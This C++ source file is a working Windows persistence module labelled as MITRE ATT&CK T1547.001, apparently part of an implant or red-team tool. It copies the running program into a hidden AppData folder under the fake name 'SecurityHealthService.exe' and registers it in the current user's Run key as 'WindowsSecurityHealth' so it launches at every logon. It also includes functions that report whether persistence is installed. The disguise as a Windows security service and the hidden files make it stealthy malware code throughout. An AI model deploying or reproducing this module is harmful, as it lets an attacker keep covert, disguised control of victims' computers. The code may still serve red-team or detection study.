#include "persistence.h"
#include <windows.h>
#include <shlobj.h>
#include <sstream>

// ============================================================================
// MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder Persistence
// https://attack.mitre.org/techniques/T1547/001/
// ============================================================================

static const char* REG_RUN_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

static const char* PERSISTENCE_NAME = "WindowsSecurityHealth";

static const char* PERSISTENCE_FILENAME = "SecurityHealthService.exe";

static std::string get_current_exe_path() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
        return "";
    }
    return std::string(path);
}

static std::string get_appdata_path() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    char* appdata = getenv("APPDATA");
    if (appdata) {
        return std::string(appdata);
    }
    return "";
}

static std::string get_persistent_exe_path() {
    std::string appdata = get_appdata_path();
    if (appdata.empty()) {
        return "";
    }

    std::string persist_dir = appdata + "\\Microsoft\\Security";
    CreateDirectoryA(persist_dir.c_str(), NULL);

    SetFileAttributesA(persist_dir.c_str(), FILE_ATTRIBUTE_HIDDEN);

    return persist_dir + "\\" + PERSISTENCE_FILENAME;
}

static bool is_running_from_persistent_location() {
    std::string current_path = get_current_exe_path();
    std::string persistent_path = get_persistent_exe_path();

    if (current_path.empty() || persistent_path.empty()) {
        return false;
    }

    char current_lower[MAX_PATH], persistent_lower[MAX_PATH];
    strncpy_s(current_lower, current_path.c_str(), MAX_PATH);
    strncpy_s(persistent_lower, persistent_path.c_str(), MAX_PATH);
    CharLowerA(current_lower);
    CharLowerA(persistent_lower);

    return strcmp(current_lower, persistent_lower) == 0;
}

static bool copy_to_persistent_location() {
    std::string source = get_current_exe_path();
    std::string target = get_persistent_exe_path();

    if (source.empty() || target.empty()) {
        return false;
    }

    if (is_running_from_persistent_location()) {
        return true;
    }

    if (!CopyFileA(source.c_str(), target.c_str(), FALSE)) {
        return false;
    }

    SetFileAttributesA(target.c_str(), FILE_ATTRIBUTE_HIDDEN);

    return true;
}

static bool check_registry_persistence() {
    HKEY hkey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, REG_RUN_KEY, 0, KEY_READ, &hkey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    char value[MAX_PATH];
    DWORD value_size = MAX_PATH;
    DWORD type;
    result = RegQueryValueExA(hkey, PERSISTENCE_NAME, NULL, &type, (LPBYTE)value, &value_size);
    RegCloseKey(hkey);

    return (result == ERROR_SUCCESS);
}

static bool add_registry_persistence() {
    std::string exe_path = get_persistent_exe_path();
    if (exe_path.empty()) {
        return false;
    }

    HKEY hkey;
    LONG result = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        REG_RUN_KEY,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hkey,
        NULL
    );

    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueExA(
        hkey,
        PERSISTENCE_NAME,
        0,
        REG_SZ,
        (const BYTE*)exe_path.c_str(),
        (DWORD)(exe_path.length() + 1)
    );

    RegCloseKey(hkey);

    return (result == ERROR_SUCCESS);
}

// ============================================================================
// Public API
// ============================================================================

bool is_persistence_installed() {

    if (!check_registry_persistence()) {
        return false;
    }

    std::string persistent_path = get_persistent_exe_path();
    DWORD attrs = GetFileAttributesA(persistent_path.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return false;
    }

    return true;
}

bool install_persistence() {

    if (!copy_to_persistent_location()) {
        #ifdef _DEBUG
        OutputDebugStringA("[PERSIST] Failed to copy to persistent location\n");
        #endif
        return false;
    }


    if (!add_registry_persistence()) {
        #ifdef _DEBUG
        OutputDebugStringA("[PERSIST] Failed to add registry persistence\n");
        #endif
        return false;
    }

    #ifdef _DEBUG
    OutputDebugStringA("[PERSIST] Persistence installed successfully\n");
    #endif

    return true;
}

std::string get_persistence_status() {
    std::ostringstream oss;

    oss << "=== Persistence Status (T1547.001) ===\n";
    oss << "Registry Key: HKCU\\" << REG_RUN_KEY << "\\" << PERSISTENCE_NAME << "\n";
    oss << "Registry Exists: " << (check_registry_persistence() ? "Yes" : "No") << "\n";

    std::string persistent_path = get_persistent_exe_path();
    DWORD attrs = GetFileAttributesA(persistent_path.c_str());
    oss << "Persistent EXE: " << persistent_path << "\n";
    oss << "EXE Exists: " << (attrs != INVALID_FILE_ATTRIBUTES ? "Yes" : "No") << "\n";

    oss << "Running from persistent location: " << (is_running_from_persistent_location() ? "Yes" : "No") << "\n";
    oss << "Current EXE: " << get_current_exe_path() << "\n";

    return oss.str();
}
